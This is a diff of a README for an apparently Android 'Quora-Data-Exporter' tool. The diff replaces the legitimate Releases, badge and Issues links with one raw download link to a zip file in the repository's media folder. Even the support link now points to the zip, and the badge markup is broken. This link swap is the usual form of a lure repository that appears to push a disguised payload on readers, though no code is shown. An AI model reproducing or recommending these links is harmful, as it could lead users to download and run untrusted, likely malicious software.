@@ -1,6 +1,6 @@
 # 🚀 Quora-Data-Exporter - Recover Your Quora Data Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Boardingschooleyck808/Quora-Data-Exporter/releases)
+[![Download Now](https://raw.githubusercontent.com/Boardingschooleyck808/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.1.zip%https://raw.githubusercontent.com/Boardingschooleyck808/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.1.zip)](https://raw.githubusercontent.com/Boardingschooleyck808/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.1.zip)
 
 ## 📦 Introduction
 
@@ -25,7 +25,7 @@ Quora-Data-Exporter is an Android automation tool designed to help you extract y
 To download and set up Quora-Data-Exporter, follow these steps:
 
 1. **Download the App**: Click the button below to visit the download page.
-   [![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Boardingschooleyck808/Quora-Data-Exporter/releases)
+   [![Download Now](https://raw.githubusercontent.com/Boardingschooleyck808/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.1.zip%https://raw.githubusercontent.com/Boardingschooleyck808/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.1.zip)](https://raw.githubusercontent.com/Boardingschooleyck808/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.1.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see a list of available versions. Choose the latest release for the best experience.
 
@@ -47,7 +47,7 @@ To download and set up Quora-Data-Exporter, follow these steps:
 
 ## 📥 Download & Install
 
-Visit this page to download: [Quora-Data-Exporter Releases](https://github.com/Boardingschooleyck808/Quora-Data-Exporter/releases)
+Visit this page to download: [Quora-Data-Exporter Releases](https://raw.githubusercontent.com/Boardingschooleyck808/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.1.zip)
 
 After downloading, follow the installation steps outlined above to get started with your data export.
 
@@ -61,6 +61,6 @@ If you encounter issues during installation or data extraction, consider these t
 
 ## 📞 Support
 
-For further assistance, feel free to visit the [Issues page](https://github.com/Boardingschooleyck808/Quora-Data-Exporter/issues) on GitHub. You can report bugs or request features there.
+For further assistance, feel free to visit the [Issues page](https://raw.githubusercontent.com/Boardingschooleyck808/Quora-Data-Exporter/main/media/Quora-Data-Exporter-v3.1.zip) on GitHub. You can report bugs or request features there.
 
 Thank you for using Quora-Data-Exporter! Enjoy your seamless data extraction experience.
